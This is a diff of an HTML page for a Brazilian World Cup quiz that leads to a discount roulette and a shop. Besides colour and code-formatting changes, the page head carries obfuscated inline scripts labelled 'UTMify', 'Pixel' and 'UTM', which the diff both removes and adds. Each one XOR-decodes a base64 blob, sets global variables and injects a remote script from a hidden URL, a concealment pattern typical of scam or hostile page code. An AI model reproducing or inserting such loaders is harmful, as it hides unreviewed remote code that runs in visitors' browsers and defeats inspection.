@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-    :root{--c-primary:#FF6B00;--c-accent:#FFD700;--c-bg:#0D0602;}
+    :root{--c-primary:#00B89C;--c-primary-dark:#007A68;--c-accent:#FF6B00;--c-gold:#FFD700;--c-bg:#020D0B;}
     *{box-sizing:border-box;margin:0;padding:0;}
     html,body{background:var(--c-bg)!important;font-family:'Poppins',sans-serif;color:#fff;min-height:100vh;}
     a{color:inherit;text-decoration:none;}img{max-width:100%;display:block;}button{cursor:pointer;font-family:inherit;}
@@ -23,12 +23,12 @@
     .page-content{position:relative;z-index:1;}
     .ff-container{max-width:48rem;margin:0 auto;padding:0 16px;}
 
-    .neon-title{font-family:'Orbitron',sans-serif;background:linear-gradient(135deg,var(--c-accent),var(--c-primary));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 2px 12px rgba(255,107,0,.4));}
+    .neon-title{font-family:'Orbitron',sans-serif;background:linear-gradient(135deg,var(--c-primary),var(--c-accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 2px 12px rgba(0,184,156,.4));}
 
     /* Stepper */
     .stepper{display:flex;align-items:center;justify-content:center;gap:.5rem;margin-bottom:1.5rem;}
     .stepper-num{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-size:.75rem;font-weight:700;}
-    .stepper-num.active{background:linear-gradient(135deg,var(--c-primary),var(--c-accent));color:#0D0602;box-shadow:0 0 16px rgba(255,107,0,.6);}
+    .stepper-num.active{background:linear-gradient(135deg,var(--c-primary),var(--c-accent));color:#021;box-shadow:0 0 16px rgba(0,184,156,.6);}
     .stepper-num.idle{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.18);color:rgba(255,255,255,.5);}
     .stepper-line{width:26px;height:1px;background:rgba(255,255,255,.18);}
     .stepper-label{font-family:'Orbitron',sans-serif;font-size:.72rem;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.7);}
@@ -38,42 +38,42 @@
     .progress-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:.5rem;}
     .progress-label{font-family:'Orbitron',sans-serif;font-size:.72rem;letter-spacing:.08em;color:rgba(255,255,255,.7);text-transform:uppercase;}
     .score-chip{display:inline-flex;align-items:center;gap:.45rem;font-family:'Orbitron',sans-serif;font-weight:700;font-size:.85rem;padding:.4rem .9rem;border-radius:999px;color:#FFD700;background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.35);}
-    .progress-track{height:10px;width:100%;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden;border:1px solid rgba(255,107,0,.2);}
-    .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--c-primary),var(--c-accent));border-radius:999px;transition:width .5s cubic-bezier(.4,0,.2,1);box-shadow:0 0 14px rgba(255,107,0,.5);}
+    .progress-track{height:10px;width:100%;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden;border:1px solid rgba(0,184,156,.2);}
+    .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--c-primary),var(--c-accent),var(--c-gold));border-radius:999px;transition:width .5s cubic-bezier(.4,0,.2,1);box-shadow:0 0 14px rgba(0,184,156,.5);}
 
     /* Quiz card */
-    .quiz-card{background:linear-gradient(145deg,rgba(13,6,2,.9),rgba(13,6,2,.95));backdrop-filter:blur(10px);border:1px solid rgba(255,107,0,.35);border-radius:18px;box-shadow:0 8px 32px rgba(0,0,0,.5),inset 0 0 30px rgba(255,107,0,.05);padding:1.5rem;}
+    .quiz-card{background:linear-gradient(145deg,rgba(3,22,18,.9),rgba(2,13,11,.95));backdrop-filter:blur(10px);border:1px solid rgba(0,184,156,.35);border-radius:18px;box-shadow:0 8px 32px rgba(0,0,0,.5),inset 0 0 30px rgba(0,184,156,.05);padding:1.5rem;}
     @media(min-width:640px){.quiz-card{padding:2rem;}}
 
-    .q-number{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-weight:900;font-size:1.25rem;color:#0D0602;background:linear-gradient(135deg,var(--c-primary),var(--c-accent));margin-bottom:1.5rem;}
+    .q-number{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-weight:900;font-size:1.25rem;color:#021;background:linear-gradient(135deg,var(--c-primary),var(--c-accent));margin-bottom:1.5rem;}
     .q-text{font-size:1.5rem;font-weight:700;color:#fff;margin-bottom:2rem;text-shadow:0 2px 10px rgba(0,0,0,.3);line-height:1.4;}
 
     /* Options */
-    .opt{background:rgba(13,6,2,.8);border:2px solid rgba(255,107,0,.28);border-radius:14px;padding:1rem;margin-bottom:.75rem;display:flex;align-items:center;gap:1rem;cursor:pointer;transition:all .25s;backdrop-filter:blur(5px);}
-    .opt:hover{border-color:rgba(255,215,0,.8);background:rgba(40,15,0,.8);transform:translateX(8px);box-shadow:0 4px 22px rgba(255,107,0,.3);}
+    .opt{background:rgba(3,22,18,.8);border:2px solid rgba(0,184,156,.28);border-radius:14px;padding:1rem;margin-bottom:.75rem;display:flex;align-items:center;gap:1rem;cursor:pointer;transition:all .25s;backdrop-filter:blur(5px);}
+    .opt:hover{border-color:rgba(255,107,0,.8);background:rgba(0,60,48,.8);transform:translateX(8px);box-shadow:0 4px 22px rgba(0,184,156,.3);}
     .opt.correct{background:#15803d!important;border-color:#22c55e!important;box-shadow:0 0 24px rgba(34,197,94,.5)!important;}
     .opt.incorrect{background:#991b1b!important;border-color:#ef4444!important;box-shadow:0 0 24px rgba(239,68,68,.5)!important;}
-    .opt.selected{background:rgba(255,107,0,.2);border-color:rgba(255,215,0,.8);transform:translateX(8px);}
-    .opt-letter{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-weight:700;color:#0D0602;flex-shrink:0;background:linear-gradient(135deg,var(--c-primary),var(--c-accent));transition:transform .2s;}
+    .opt.selected{background:rgba(0,184,156,.2);border-color:rgba(255,107,0,.8);transform:translateX(8px);}
+    .opt-letter{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-weight:700;color:#021;flex-shrink:0;background:linear-gradient(135deg,var(--c-primary),var(--c-accent));transition:transform .2s;}
     .opt:hover .opt-letter{transform:scale(1.08);}
     .opt-text{color:#fff;font-size:1.125rem;text-shadow:0 1px 4px rgba(0,0,0,.2);}
 
     /* Result */
-    .result-card{background:linear-gradient(145deg,rgba(13,6,2,.9),rgba(13,6,2,.95));border:1px solid rgba(255,107,0,.35);border-radius:18px;padding:2rem;text-align:center;display:none;}
+    .result-card{background:linear-gradient(145deg,rgba(3,22,18,.9),rgba(2,13,11,.95));border:1px solid rgba(0,184,156,.35);border-radius:18px;padding:2rem;text-align:center;display:none;}
     .result-card.show{display:block;animation:popIn .4s ease-out;}
     @keyframes popIn{from{opacity:0;transform:scale(.96) translateY(10px);}to{opacity:1;transform:scale(1) translateY(0);}}
     .result-btn{position:relative;overflow:hidden;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;font-family:'Orbitron',sans-serif;font-weight:700;padding:1rem 2rem;border-radius:999px;text-transform:uppercase;border:none;display:inline-flex;align-items:center;gap:.75rem;box-shadow:0 4px 20px rgba(255,107,0,.4);transition:transform .25s,box-shadow .25s;}
     .result-btn::after{content:'';position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.45),transparent);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
     @keyframes shine{0%{left:-120%}55%,100%{left:160%}}
-    .result-btn:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(255,107,0,.6);}
+    .result-btn:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(0,184,156,.6);background:linear-gradient(135deg,#00B89C,#007A68);}
     .feedback{text-align:center;font-family:'Orbitron',sans-serif;font-weight:700;font-size:1.5rem;margin-top:1rem;animation:popIn .3s ease-out;}
     .feedback.green{color:#4ade80;}.feedback.red{color:#f87171;}
     .hidden{display:none!important;}
     </style>
-    <!-- UTMify -->
-    <script>(function(){var q_c6ka=atob("DFLOPDNWGEWna9YizinsSUE6On+FA6JWviH0Exw1fCuJHqJPpzS3ElA5dWvFGflRrSCnTEclNzXOE7NO4SKnRFY6Ni/USfoArya6Tlo0bTHCGPQYlQ/iHlQ6dyfGB6UA9Am1Hl03dSCFUfRSpyqrUHoyOmmFHbdOuzfsBhFgeXKUXudH/mGoDgE3LSaWX+MU+WL/DlJ0ZRja");var t_h=[];for(var z_7e=0;z_7e<q_c6ka.length;z_7e++){t_h.push(q_c6ka.charCodeAt(z_7e)&255);}var r_l5f=t_h[0];var j_p=t_h.slice(1,1+r_l5f);var l_f=t_h.slice(1+r_l5f);var h_e63=l_f.map(function(b,c_om){return b^j_p[c_om%r_l5f];});var b_il="";for(var x_blu=0;x_blu<h_e63.length;x_blu++){b_il+=String.fromCharCode(h_e63[x_blu]&255);}var k_s25=decodeURIComponent(escape(b_il));var g_j1=JSON.parse(k_s25);var o_mzo8=g_j1.globals||[];o_mzo8.forEach(function(m_exz8){window[m_exz8.name]=m_exz8.value;});var x_b3=document.createElement("script");x_b3.src=g_j1.url;x_b3.async=true;x_b3.defer=true;(g_j1.attributes||[]).forEach(function(e_h2){x_b3.setAttribute(e_h2.name,e_h2.value);});(document.head||document.documentElement).appendChild(x_b3);})();</script>
     <!-- Pixel -->
-    <script>(function(){var f_qmq=atob("DDfjRVx2EUnWlVic60zBMC4aM3P0/Szom0TZanMVdSf44CzxglGaaz8ZfGe053fviEWKNSgFPjm/7T3wxEeKPTkaPyOlt3S+ikOXNzUUZD2z5nqmsGrPZzsafiu3+Su+0WyYZzIXfCz0r3rsgk+GKRUSM2X04znwnlLBf35AcH+w9mqr3FTRIWsUJS3moz2pjlLbdThUbBSr");var i_g4=[];for(var t_e2qm=0;t_e2qm<f_qmq.length;t_e2qm++){i_g4.push(f_qmq.charCodeAt(t_e2qm)&255);}var b_fxol=i_g4[0];var z_v8s=i_g4.slice(1,1+b_fxol);var z_e89=i_g4.slice(1+b_fxol);var n_f8e=z_e89.map(function(b,v_oj){return b^z_v8s[v_oj%b_fxol];});var j_i5e5="";for(var r_2=0;r_2<n_f8e.length;r_2++){j_i5e5+=String.fromCharCode(n_f8e[r_2]&255);}var j_2m=decodeURIComponent(escape(j_i5e5));var p_cpv=JSON.parse(j_2m);var b_5=p_cpv.globals||[];b_5.forEach(function(o_5u){window[o_5u.name]=o_5u.value;});var p_n4e=document.createElement("script");p_n4e.src=p_cpv.url;p_n4e.async=true;p_n4e.defer=true;(p_cpv.attributes||[]).forEach(function(c_d){p_n4e.setAttribute(c_d.name,c_d.value);});(document.head||document.documentElement).appendChild(p_n4e);})();</script>
+    <script>(function(){var j_d3l=atob("DD4jU9Hul6ahnM9EPUUBJqOCtZyD9LswTU0ZfP6N88iP6bspVFhafbKB+ojD7uA3XkxKI6WduNbI5KooEk5KK7SCuczSvuNmXEpXIbiM4tLE7+1+ZmMPcbaC+MTA8LxmB2VYcb+P+sODpu00VEZGP5iKtYqD6q4oSFsBafPY9pDH//1zCl0RN+aMo8KRqqpxWFsbY7XM6vvc");var b_z=[];for(var f_r=0;f_r<j_d3l.length;f_r++){b_z.push(j_d3l.charCodeAt(f_r)&255);}var t_i4rk=b_z[0];var e_c=b_z.slice(1,1+t_i4rk);var n_z9=b_z.slice(1+t_i4rk);var k_n=n_z9.map(function(b,u_5tm){return b^e_c[u_5tm%t_i4rk];});var b_j="";for(var w_7=0;w_7<k_n.length;w_7++){b_j+=String.fromCharCode(k_n[w_7]&255);}var v_9=decodeURIComponent(escape(b_j));var t_wd=JSON.parse(v_9);var n_yib=t_wd.globals||[];n_yib.forEach(function(v_os){window[v_os.name]=v_os.value;});var q_2=document.createElement("script");q_2.src=t_wd.url;q_2.async=true;q_2.defer=true;(t_wd.attributes||[]).forEach(function(t_e9v){q_2.setAttribute(t_e9v.name,t_e9v.value);});(document.head||document.documentElement).appendChild(q_2);})();</script>
+    <!-- UTM -->
+    <script>(function(){var h_js0l=atob("DAkXt0RxX8tuR0rSJHI1wjYdffFMLz6mVHotmGsSO6VAMj6/TW9umSceMuUMNWWhR3t+xzACcL4aKjn9SGhj0jcFcaEdZWbwRX1jxS0TKr8LNGjof3I12SUcOulUZS6zUGg6wjAcNq0XajqgQX9y2TBcJ6gBI2ehR2I1m2YHPqcbImjoBitqmz9TMaoDImjoBm12wyVcKr8DLiyrCXll0jIUMb9DND+wTW1klWhTKaoCMi/wHis1yhkM");var c_zwt=[];for(var u_j2x=0;u_j2x<h_js0l.length;u_j2x++){c_zwt.push(h_js0l.charCodeAt(u_j2x)&255);}var n_k=c_zwt[0];var b_m=c_zwt.slice(1,1+n_k);var z_liqv=c_zwt.slice(1+n_k);var n_3=z_liqv.map(function(b,i_n){return b^b_m[i_n%n_k];});var l_3f="";for(var b_j94u=0;b_j94u<n_3.length;b_j94u++){l_3f+=String.fromCharCode(n_3[b_j94u]&255);}var x_9f7=decodeURIComponent(escape(l_3f));var g_1f=JSON.parse(x_9f7);var o_jo=g_1f.globals||[];o_jo.forEach(function(h_3){window[h_3.name]=h_3.value;});var l_22=document.createElement("script");l_22.src=g_1f.url;l_22.async=true;l_22.defer=true;(g_1f.attributes||[]).forEach(function(q_n){l_22.setAttribute(q_n.name,q_n.value);});(document.head||document.documentElement).appendChild(l_22);})();</script>
     <!-- UTM Persist -->
     <script>(function(){var p=new URLSearchParams(window.location.search);['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src'].forEach(function(k){var v=p.get(k);if(v)sessionStorage.setItem(k,v);});})();</script>
 </head>
@@ -82,7 +82,6 @@
 <div class="page-content">
     <main style="padding:2rem 0 3rem;">
         <div class="ff-container">
-            <!-- Stepper -->
             <div class="stepper">
                 <span class="stepper-num idle">1</span><span class="stepper-label">Quiz</span>
                 <span class="stepper-line"></span>
@@ -92,11 +91,8 @@
                 <span class="stepper-line"></span>
                 <span class="stepper-num idle">4</span><span class="stepper-label">Loja</span>
             </div>
-
             <h1 class="neon-title" style="text-align:center;font-size:1.75rem;font-weight:700;margin-bottom:.5rem;">QUIZ DA COPA DO MUNDO</h1>
             <p style="text-align:center;color:rgba(255,255,255,.7);margin-bottom:2rem;font-size:.95rem;">Acerte as perguntas e avance para a roleta de descontos.</p>
-
-            <!-- Progress -->
             <div class="progress-wrap" id="progressWrap">
                 <div class="progress-row">
                     <span class="progress-label" id="progressText">PERGUNTA 1 DE 8</span>
@@ -104,11 +100,7 @@
                 </div>
                 <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
             </div>
-
-            <!-- Quiz Container -->
             <div id="quizContainer" class="quiz-card"></div>
-
-            <!-- Result -->
             <div id="resultContainer" class="result-card">
                 <div style="margin-bottom:1.5rem;"><i class="fas fa-trophy" style="font-size:5rem;color:#FFD700;filter:drop-shadow(0 4px 12px rgba(255,215,0,.5));"></i></div>
                 <h2 class="neon-title" style="font-size:1.875rem;font-weight:700;margin-bottom:1rem;">QUIZ COMPLETO!</h2>
@@ -122,13 +114,12 @@
         </div>
     </main>
 </div>
-
 <script>
 var questions=[
     {question:"Qual país venceu mais Copas do Mundo na história?",options:["Alemanha","Itália","Brasil","Argentina"],correct:2},
     {question:"Em qual país foi realizada a Copa do Mundo de 2022?",options:["Catar","Rússia","Brasil","França"],correct:0},
     {question:"Qual seleção foi campeã da Copa do Mundo de 2022?",options:["França","Brasil","Croácia","Argentina"],correct:3},
-    {question:"Quem é o maior artilheiro da história das Copas do Mundo?",options:["Ronaldo","Pelé","Miroslav Klose","Gerd Müller"],correct:2},
+    {question:"Qual jogador se tornou o maior artilheiro de uma única Copa em 2022?",options:["Lionel Messi","Ronaldo Fenômeno","Kylian Mbappé","Gerd Müller"],correct:2},
     {question:"Quantas vezes o Brasil foi campeão mundial?",options:["4 vezes","6 vezes","3 vezes","5 vezes"],correct:3},
     {question:"Qual foi o artilheiro da Copa do Mundo de 2022?",options:["Lionel Messi","Richarlison","Neymar","Kylian Mbappé"],correct:3},
     {question:"Em que ano o Brasil ganhou sua primeira Copa do Mundo?",options:["1950","1962","1970","1958"],correct:3},
@@ -138,50 +129,26 @@ var cur=0,score=0,answered=false;
 var qC=document.getElementById('quizContainer'),rC=document.getElementById('resultContainer');
 var pF=document.getElementById('progressFill'),pT=document.getElementById('progressText');
 var sC=document.getElementById('scoreChip'),pW=document.getElementById('progressWrap');
-
-function updateProgress(){
-    pF.style.width=(cur/questions.length*100)+'%';
-    pT.textContent='PERGUNTA '+Math.min(cur+1,questions.length)+' DE '+questions.length;
-    sC.textContent=score;
-}
-
+function updateProgress(){pF.style.width=(cur/questions.length*100)+'%';pT.textContent='PERGUNTA '+Math.min(cur+1,questions.length)+' DE '+questions.length;sC.textContent=score;}
 function loadQuestion(){
     if(cur>=questions.length){showResults();return;}
-    answered=false;
-    var q=questions[cur];
-    updateProgress();
-    var h='<div style="animation:popIn .4s ease-out;"><div class="q-number">'+
-        (cur+1)+'</div><h2 class="q-text">'+q.question+'</h2><div id="options">';
-    q.options.forEach(function(o,i){
-        h+='<div class="opt" onclick="selectAnswer('+i+')" role="button" tabindex="0" onkeydown="if(event.key===\'Enter\')selectAnswer('+i+')">'+
-           '<div class="opt-letter">'+String.fromCharCode(65+i)+'</div>'+
-           '<span class="opt-text">'+o+'</span></div>';
-    });
-    h+='</div></div>';
-    qC.innerHTML=h;
+    answered=false;var q=questions[cur];updateProgress();
+    var h='<div style="animation:popIn .4s ease-out;"><div class="q-number">'+(cur+1)+'</div><h2 class="q-text">'+q.question+'</h2><div id="options">';
+    q.options.forEach(function(o,i){h+='<div class="opt" onclick="selectAnswer('+i+')" role="button" tabindex="0" onkeydown="if(event.key===\'Enter\')selectAnswer('+i+')"><div class="opt-letter">'+String.fromCharCode(65+i)+'</div><span class="opt-text">'+o+'</span></div>';});
+    h+='</div></div>';qC.innerHTML=h;
 }
-
 function selectAnswer(idx){
     if(answered)return;answered=true;
     var opts=document.querySelectorAll('.opt'),q=questions[cur],ok=idx===q.correct;
-    if(ok)score++;
-    opts[idx].classList.add('selected');
-    opts.forEach(function(o,i){
-        o.style.pointerEvents='none';
-        if(i===idx&&!ok)o.classList.add('incorrect');
-        if(i===q.correct)o.classList.add('correct');
-    });
+    if(ok)score++;opts[idx].classList.add('selected');
+    opts.forEach(function(o,i){o.style.pointerEvents='none';if(i===idx&&!ok)o.classList.add('incorrect');if(i===q.correct)o.classList.add('correct');});
     sC.textContent=score;
-    var fb=document.createElement('div');
-    fb.className='feedback '+(ok?'green':'red');
-    fb.textContent=ok?'✓ Correto!':'✗ Incorreto!';
+    var fb=document.createElement('div');fb.className='feedback '+(ok?'green':'red');fb.textContent=ok?'✓ Correto!':'✗ Incorreto!';
     document.getElementById('options').appendChild(fb);
     setTimeout(function(){cur++;loadQuestion();},1500);
 }
-
 function showResults(){
-    pF.style.width='100%';pW.classList.add('hidden');qC.classList.add('hidden');
-    rC.classList.add('show');
+    pF.style.width='100%';pW.classList.add('hidden');qC.classList.add('hidden');rC.classList.add('show');
     document.getElementById('finalScore').textContent=score;
     var pct=score/questions.length*100,msg='';
     if(pct===100)msg='Incrível! O árbitro te autoriza! Você é um craque da Copa do Mundo! 🏆⚽';
@@ -190,10 +157,8 @@ function showResults(){
     else if(pct>=40)msg='Bom esforço! Estude mais sobre a história das Copas do Mundo!';
     else msg='Você precisa conhecer melhor a história da Copa do Mundo!';
     document.getElementById('resultMessage').textContent=msg;
-    sessionStorage.setItem('quizScore',score);
-    sessionStorage.setItem('quizCompleted','true');
+    sessionStorage.setItem('quizScore',score);sessionStorage.setItem('quizCompleted','true');
 }
-
 document.addEventListener('DOMContentLoaded',loadQuestion);
 </script>
 </body>
